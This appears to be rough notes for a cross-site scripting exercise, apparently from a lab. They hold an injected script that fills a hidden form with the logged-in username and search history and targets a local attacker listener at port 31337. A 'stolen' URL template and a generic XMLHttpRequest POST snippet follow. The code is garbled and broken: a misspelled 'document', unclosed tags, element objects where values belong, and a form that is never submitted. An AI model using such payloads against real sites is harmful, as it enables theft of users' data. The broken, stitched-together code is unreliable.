<script>

<form name='payload' id="payload" action='http://127.0.0.1:31337/'>
<input type='hidden' name='username'/>
<input type='hidden' name='searchHist'/>


<script type="text/javascript">

   var formInfo= docuent.forms['payload'];
   var username = document.getElementById('logged-in-user');
   var searchHist = document.getElementById('history-list');

   formInfo.username.value = username
   formInfo.searchHist.value = searchHist

</script>

http://127.0.0.1:31337/stolen?user=<username>&last_search=<last search>
var http = new XMLHttpRequest();
var url = "get_data.php";
var params = "lorem=ipsum&name=binny";
http.open("POST", url, true);

//Send the proper header information along with the request
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
        alert(http.responseText);
    }
}
http.send(params);
